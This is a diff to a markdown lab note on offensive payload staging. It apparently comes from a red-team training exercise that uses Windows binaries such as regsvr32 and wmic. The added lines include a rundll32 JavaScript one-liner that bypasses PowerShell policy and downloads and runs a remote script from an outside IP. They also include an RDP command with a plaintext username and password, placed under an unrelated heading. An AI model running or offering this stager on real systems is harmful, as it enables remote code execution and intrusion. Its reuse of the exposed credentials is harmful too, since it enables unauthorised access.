@@ -20,8 +20,13 @@ This lab will focus on creating multiple payloads and then testing them in the s
 ## [[SCT stager and execute with regsvr32.exe]]
 
 #### *Payload:* Create a SCT stager
+`xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp`
 
-#### *Execution Technique:* Executing Stager with regsvr32.exe
+#### *Execution Technique:* 
+```markdown
+# Executing Stager with regsvr32.exe
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
+```
 
 ---
 ## [[WMIC stager and execute with wmic]]
